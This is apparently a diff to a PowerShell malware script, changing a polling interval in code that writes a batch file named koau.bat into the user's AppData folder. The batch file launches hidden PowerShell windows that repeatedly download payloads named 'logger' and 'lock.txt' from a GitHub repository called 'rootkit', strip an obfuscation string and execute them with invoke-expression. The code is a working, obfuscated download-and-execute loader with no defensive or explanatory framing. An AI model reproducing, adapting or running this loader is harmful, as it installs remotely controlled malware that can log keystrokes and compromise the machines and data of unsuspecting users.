@@ -57,7 +57,7 @@ function Set_bootACL($filepath)
 
 $paFile        = $env:appdata + '\koau.bat'
 $content1 ="cmd /c start /min powershell start-process powershell {[string]`$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/logger')};`$qweewqq=`$nbvccxx.Replace('wererfvx','');`$zxdsxxxxc=iex `$qweewqq;invoke-expression `$zxdsxxxxc;} -windowstyle hidden"
-$content2 = "cmd /c start /min powershell start-process powershell {while(`$true){[string]`$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/lock.txt')};`$qweewqq=`$nbvccxx.Replace('wererfvx','');`$zxdsxxxxc=iex `$qweewqq;invoke-expression `$zxdsxxxxc;start-sleep -s 60}} -windowstyle hidden"
+$content2 = "cmd /c start /min powershell start-process powershell {while(`$true){[string]`$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/lock.txt')};`$qweewqq=`$nbvccxx.Replace('wererfvx','');`$zxdsxxxxc=iex `$qweewqq;invoke-expression `$zxdsxxxxc;start-sleep -s 3600}} -windowstyle hidden"
 $sef = $content1 + "`r`n" + "timeout `/t 1 `/nobreak >nul" + "`r`n" + $content2
 sc -Path $paFile -Value $sef -Encoding 'ascii'
 # sc $paFile $content2 -Encoding 'utf8'
